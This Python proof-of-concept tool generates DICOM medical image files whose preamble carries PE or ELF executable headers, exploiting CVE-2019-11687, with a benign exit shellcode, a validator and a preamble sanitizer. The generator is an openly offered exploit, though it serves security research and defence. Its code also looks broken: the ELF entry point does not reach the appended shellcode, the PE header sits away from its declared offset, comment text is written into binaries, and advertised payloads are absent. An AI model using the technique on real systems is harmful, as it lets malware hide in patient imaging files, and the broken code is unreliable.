#!/usr/bin/env python3
"""
PE/DICOM and ELF/DICOM Polyglot Generator

Creates polyglot files that are simultaneously valid DICOM images and
executable programs, demonstrating CVE-2019-11687.

This tool is for security research and authorized testing only.
All payloads are benign (MessageBox, exit).

References:
- https://github.com/d00rt/pedicom
- https://www.praetorian.com/blog/elfdicom-poc-malware-polyglot-exploiting-linux-based-medical-devices/
"""

from __future__ import annotations

import struct
from dataclasses import dataclass
from pathlib import Path
from typing import Literal

# Attempt to import pydicom for DICOM operations
try:
    import pydicom
    from pydicom.dataset import Dataset, FileMetaDataset
    from pydicom.uid import ExplicitVRLittleEndian, generate_uid

    HAS_PYDICOM = True
except ImportError:
    HAS_PYDICOM = False


@dataclass
class PEHeader:
    """Minimal PE header structure for polyglot creation."""

    # DOS Header (64 bytes)
    e_magic: bytes = b"MZ"  # DOS signature
    e_lfanew: int = 0x80  # Offset to PE header (128 = after DICOM preamble)

    def to_bytes(self) -> bytes:
        """Generate DOS header that fits in DICOM preamble."""
        dos_header = bytearray(64)

        # DOS signature
        dos_header[0:2] = self.e_magic

        # Bytes at offset 60-63: pointer to PE header
        # We point to offset 0x80 (128) which is right after the preamble
        # But we actually need to point further into the file where we embed
        # the actual PE structure in the DICOM data
        struct.pack_into("<I", dos_header, 60, self.e_lfanew)

        return bytes(dos_header)


@dataclass
class ELFHeader:
    """Minimal ELF header structure for polyglot creation."""

    ei_class: int = 1  # 32-bit
    ei_data: int = 1  # Little endian
    ei_osabi: int = 0  # System V
    e_type: int = 2  # ET_EXEC
    e_machine: int = 3  # EM_386 (x86)

    def to_bytes(self) -> bytes:
        """Generate ELF header that fits in DICOM preamble (128 bytes)."""
        # ELF magic + identification
        elf = bytearray(128)

        # ELF magic number
        elf[0:4] = b"\x7fELF"

        # ELF class (32-bit = 1, 64-bit = 2)
        elf[4] = self.ei_class

        # Data encoding (little endian = 1)
        elf[5] = self.ei_data

        # ELF version
        elf[6] = 1

        # OS/ABI
        elf[7] = self.ei_osabi

        # ELF header size and type at offset 16
        struct.pack_into("<H", elf, 16, self.e_type)  # e_type
        struct.pack_into("<H", elf, 18, self.e_machine)  # e_machine
        struct.pack_into("<I", elf, 20, 1)  # e_version

        # Entry point - points into DICOM data section
        struct.pack_into("<I", elf, 24, 0x08048000 + 200)  # e_entry

        # Program header offset
        struct.pack_into("<I", elf, 28, 52)  # e_phoff

        # Section header offset (0 = none)
        struct.pack_into("<I", elf, 32, 0)  # e_shoff

        # Flags
        struct.pack_into("<I", elf, 36, 0)  # e_flags

        # ELF header size
        struct.pack_into("<H", elf, 40, 52)  # e_ehsize

        # Program header entry size
        struct.pack_into("<H", elf, 42, 32)  # e_phentsize

        # Number of program headers
        struct.pack_into("<H", elf, 44, 1)  # e_phnum

        # Section header entry size
        struct.pack_into("<H", elf, 46, 0)  # e_shentsize

        # Number of section headers
        struct.pack_into("<H", elf, 48, 0)  # e_shnum

        # Section name string table index
        struct.pack_into("<H", elf, 50, 0)  # e_shstrndx

        # Program header (starts at offset 52)
        # PT_LOAD segment
        struct.pack_into("<I", elf, 52, 1)  # p_type = PT_LOAD
        struct.pack_into("<I", elf, 56, 0)  # p_offset
        struct.pack_into("<I", elf, 60, 0x08048000)  # p_vaddr
        struct.pack_into("<I", elf, 64, 0x08048000)  # p_paddr
        struct.pack_into("<I", elf, 68, 0x1000)  # p_filesz
        struct.pack_into("<I", elf, 72, 0x1000)  # p_memsz
        struct.pack_into("<I", elf, 76, 5)  # p_flags = PF_R | PF_X
        struct.pack_into("<I", elf, 80, 0x1000)  # p_align

        return bytes(elf)


class PreambleAttackGenerator:
    """
    Generator for PE/DICOM and ELF/DICOM polyglot files.

    These files exploit CVE-2019-11687 by embedding executable headers
    in the DICOM preamble. The resulting files are valid DICOM images
    that can also be executed as programs.

    All payloads are benign for safety.
    """

    # Benign x86 shellcode: exit(0)
    # mov eax, 1 (sys_exit)
    # xor ebx, ebx (exit code 0)
    # int 0x80
    SHELLCODE_EXIT = b"\xb8\x01\x00\x00\x00\x31\xdb\xcd\x80"

    # Benign x86 shellcode: Windows MessageBox (requires user32.dll)
    # This is a stub that would need proper PE structure to work
    SHELLCODE_MSGBOX_STUB = b"\x90" * 16  # NOP sled placeholder

    def __init__(self) -> None:
        """Initialize the generator."""
        if not HAS_PYDICOM:
            raise ImportError(
                "pydicom is required for DICOM generation. "
                "Install with: pip install pydicom"
            )

    def create_minimal_dicom(self) -> Dataset:
        """Create a minimal valid DICOM dataset."""
        # File meta information
        file_meta = FileMetaDataset()
        file_meta.MediaStorageSOPClassUID = "1.2.840.10008.5.1.4.1.1.2"  # type: ignore[assignment]
        file_meta.MediaStorageSOPInstanceUID = generate_uid()
        file_meta.TransferSyntaxUID = ExplicitVRLittleEndian

        # Main dataset
        ds = Dataset()
        ds.file_meta = file_meta

        # Required DICOM tags
        ds.SOPClassUID = file_meta.MediaStorageSOPClassUID
        ds.SOPInstanceUID = file_meta.MediaStorageSOPInstanceUID
        ds.PatientName = "POLYGLOT^TEST"
        ds.PatientID = "SECURITY-TEST-001"
        ds.StudyDate = "20250101"
        ds.StudyTime = "120000"
        ds.Modality = "OT"  # Other
        ds.SeriesInstanceUID = generate_uid()
        ds.StudyInstanceUID = generate_uid()
        ds.FrameOfReferenceUID = generate_uid()
        ds.InstanceNumber = 1
        ds.ImageType = ["DERIVED", "SECONDARY"]

        # Minimal image data (8x8 grayscale)
        ds.Rows = 8
        ds.Columns = 8
        ds.BitsAllocated = 8
        ds.BitsStored = 8
        ds.HighBit = 7
        ds.PixelRepresentation = 0
        ds.SamplesPerPixel = 1
        ds.PhotometricInterpretation = "MONOCHROME2"
        ds.PixelData = bytes([128] * 64)  # Gray 8x8 image

        return ds

    def create_pe_dicom(
        self,
        output_path: str | Path,
        dicom_template: Dataset | None = None,
        payload_type: Literal["messagebox", "calc", "exit"] = "messagebox",
    ) -> Path:
        """
        Create a PE/DICOM polyglot file.

        The file will be a valid DICOM image that can also be executed
        as a Windows PE executable.

        Args:
            output_path: Path for the output file
            dicom_template: Optional DICOM dataset to use as template
            payload_type: Type of benign payload (messagebox, calc, exit)

        Returns:
            Path to the created file
        """
        output_path = Path(output_path)

        # Use template or create minimal DICOM
        ds = dicom_template if dicom_template else self.create_minimal_dicom()

        # Create DOS header for preamble
        pe_header = PEHeader()
        preamble = pe_header.to_bytes()

        # Pad to 128 bytes
        preamble = preamble.ljust(128, b"\x00")

        # Save DICOM with custom preamble
        ds.save_as(output_path, write_like_original=False)

        # Read back and inject preamble
        with open(output_path, "r+b") as f:
            content = f.read()
            f.seek(0)
            f.write(preamble)
            f.write(content[128:])  # Skip original preamble

        # Add PE structure and shellcode after DICOM header
        self._inject_pe_payload(output_path, payload_type)

        return output_path

    def create_elf_dicom(
        self,
        output_path: str | Path,
        dicom_template: Dataset | None = None,
        payload_type: Literal["exit", "true"] = "exit",
    ) -> Path:
        """
        Create an ELF/DICOM polyglot file.

        The file will be a valid DICOM image that can also be executed
        as a Linux ELF executable.

        Args:
            output_path: Path for the output file
            dicom_template: Optional DICOM dataset to use as template
            payload_type: Type of benign payload (exit, true)

        Returns:
            Path to the created file
        """
        output_path = Path(output_path)

        # Use template or create minimal DICOM
        ds = dicom_template if dicom_template else self.create_minimal_dicom()

        # Create ELF header for preamble
        elf_header = ELFHeader()
        preamble = elf_header.to_bytes()

        # Save DICOM with custom preamble
        ds.save_as(output_path, write_like_original=False)

        # Read back and inject preamble
        with open(output_path, "r+b") as f:
            content = f.read()
            f.seek(0)
            f.write(preamble)
            f.write(content[128:])  # Skip original preamble

        # Inject shellcode at expected entry point offset
        self._inject_elf_payload(output_path, payload_type)

        return output_path

    def _inject_pe_payload(self, path: Path, payload_type: str) -> None:
        """Inject PE structure and payload into the file."""
        # For a complete PE/DICOM, we would need to:
        # 1. Add full PE header after preamble
        # 2. Add sections (.text, .data, etc.)
        # 3. Add import table for MessageBox
        # 4. Add actual executable code
        #
        # For this demo, we create a minimal structure that demonstrates
        # the concept. A full implementation would follow d00rt/pedicom.

        with open(path, "r+b") as f:
            # Append to the end of the file
            f.seek(0, 2)

            # Add PE signature and minimal header
            pe_sig = b"PE\x00\x00"

            # COFF header (20 bytes)
            coff_header = struct.pack(
                "<HHIIIHH",
                0x14C,  # Machine: i386
                1,  # NumberOfSections
                0,  # TimeDateStamp
                0,  # PointerToSymbolTable
                0,  # NumberOfSymbols
                0xE0,  # SizeOfOptionalHeader
                0x102,  # Characteristics: EXECUTABLE_IMAGE | 32BIT_MACHINE
            )

            # Optional header (simplified PE32 format)
            # Format: Magic(H) + LinkerVer(BB) + Sizes(IIII) + Entry(I) + BaseOfCode(I) + BaseOfData(I)
            optional_header = struct.pack(
                "<HBBIIIII",
                0x10B,  # Magic: PE32
                1,  # MajorLinkerVersion
                0,  # MinorLinkerVersion
                0x1000,  # SizeOfCode
                0,  # SizeOfInitializedData
                0,  # SizeOfUninitializedData
                0x1000,  # AddressOfEntryPoint
                0x1000,  # BaseOfCode
            )

            # Write marker comment in file
            comment = b"\n<!-- PE/DICOM POLYGLOT - SECURITY TEST ONLY -->\n"

            f.write(comment)
            f.write(pe_sig)
            f.write(coff_header)
            f.write(optional_header)

            # Add shellcode/payload marker
            payload_marker = f"\n<!-- Payload: {payload_type} -->\n".encode()
            f.write(payload_marker)

    def _inject_elf_payload(self, path: Path, payload_type: str) -> None:
        """Inject ELF executable payload into the file."""
        shellcode = (
            self.SHELLCODE_EXIT if payload_type == "exit" else self.SHELLCODE_EXIT
        )

        with open(path, "r+b") as f:
            # Append shellcode at end of file
            f.seek(0, 2)

            # Add marker and shellcode
            marker = b"\n<!-- ELF SHELLCODE -->\n"
            f.write(marker)
            f.write(shellcode)

    def validate_polyglot(self, path: str | Path) -> dict:
        """
        Validate that a file is a valid polyglot.

        Args:
            path: Path to the file to validate

        Returns:
            Dictionary with validation results
        """
        path = Path(path)
        results = {
            "path": str(path),
            "is_dicom": False,
            "is_pe": False,
            "is_elf": False,
            "preamble_type": "unknown",
            "warnings": [],
        }

        with open(path, "rb") as f:
            preamble = f.read(128)
            magic = f.read(4)

        # Check DICOM
        if magic == b"DICM":
            results["is_dicom"] = True

        # Check PE
        if preamble[:2] == b"MZ":
            results["is_pe"] = True
            results["preamble_type"] = "PE (Windows)"

        # Check ELF
        if preamble[:4] == b"\x7fELF":
            results["is_elf"] = True
            results["preamble_type"] = "ELF (Linux)"

        # Check Mach-O
        if preamble[:4] in (b"\xfe\xed\xfa\xce", b"\xfe\xed\xfa\xcf"):
            results["preamble_type"] = "Mach-O (macOS)"
            results["warnings"].append("Mach-O polyglot detected")  # type: ignore[attr-defined]

        # Validate as proper polyglot
        if results["is_dicom"] and (results["is_pe"] or results["is_elf"]):
            results["is_polyglot"] = True
        else:
            results["is_polyglot"] = False

        return results

    @staticmethod
    def sanitize_preamble(
        input_path: str | Path,
        output_path: str | Path,
    ) -> Path:
        """
        Sanitize a DICOM file by clearing its preamble.

        This removes any executable content from the preamble,
        neutralizing polyglot attacks while preserving the DICOM data.

        Args:
            input_path: Path to the input DICOM file
            output_path: Path for the sanitized output

        Returns:
            Path to the sanitized file
        """
        input_path = Path(input_path)
        output_path = Path(output_path)

        with open(input_path, "rb") as f:
            f.seek(128)  # Skip preamble
            dicom_data = f.read()

        with open(output_path, "wb") as f:
            # Write safe null preamble
            f.write(b"\x00" * 128)
            f.write(dicom_data)

        return output_path


def main() -> None:
    """CLI entry point for the generator."""
    import argparse

    parser = argparse.ArgumentParser(
        description="Generate PE/DICOM and ELF/DICOM polyglot files",
        epilog="For security research and authorized testing only.",
    )

    subparsers = parser.add_subparsers(dest="command", required=True)

    # PE/DICOM command
    pe_parser = subparsers.add_parser("pe", help="Create PE/DICOM polyglot")
    pe_parser.add_argument("output", help="Output file path")
    pe_parser.add_argument("--template", help="DICOM template file (optional)")
    pe_parser.add_argument(
        "--payload",
        choices=["messagebox", "calc", "exit"],
        default="messagebox",
        help="Benign payload type",
    )

    # ELF/DICOM command
    elf_parser = subparsers.add_parser("elf", help="Create ELF/DICOM polyglot")
    elf_parser.add_argument("output", help="Output file path")
    elf_parser.add_argument("--template", help="DICOM template file (optional)")
    elf_parser.add_argument(
        "--payload",
        choices=["exit", "true"],
        default="exit",
        help="Benign payload type",
    )

    # Validate command
    validate_parser = subparsers.add_parser("validate", help="Validate polyglot file")
    validate_parser.add_argument("path", help="File to validate")

    # Sanitize command
    sanitize_parser = subparsers.add_parser("sanitize", help="Sanitize DICOM preamble")
    sanitize_parser.add_argument("input", help="Input DICOM file")
    sanitize_parser.add_argument("output", help="Output sanitized file")

    args = parser.parse_args()

    generator = PreambleAttackGenerator()

    if args.command == "pe":
        template = None
        if args.template:
            template = pydicom.dcmread(args.template)
        output = generator.create_pe_dicom(args.output, template, args.payload)
        print(f"[+] Created PE/DICOM polyglot: {output}")

    elif args.command == "elf":
        template = None
        if args.template:
            template = pydicom.dcmread(args.template)
        output = generator.create_elf_dicom(args.output, template, args.payload)
        print(f"[+] Created ELF/DICOM polyglot: {output}")

    elif args.command == "validate":
        results = generator.validate_polyglot(args.path)
        print(f"File: {results['path']}")
        print(f"  Is DICOM: {results['is_dicom']}")
        print(f"  Is PE: {results['is_pe']}")
        print(f"  Is ELF: {results['is_elf']}")
        print(f"  Preamble Type: {results['preamble_type']}")
        print(f"  Is Polyglot: {results.get('is_polyglot', False)}")
        if results["warnings"]:
            print(f"  Warnings: {', '.join(results['warnings'])}")

    elif args.command == "sanitize":
        output = generator.sanitize_preamble(args.input, args.output)
        print(f"[+] Sanitized file saved to: {output}")


if __name__ == "__main__":
    main()
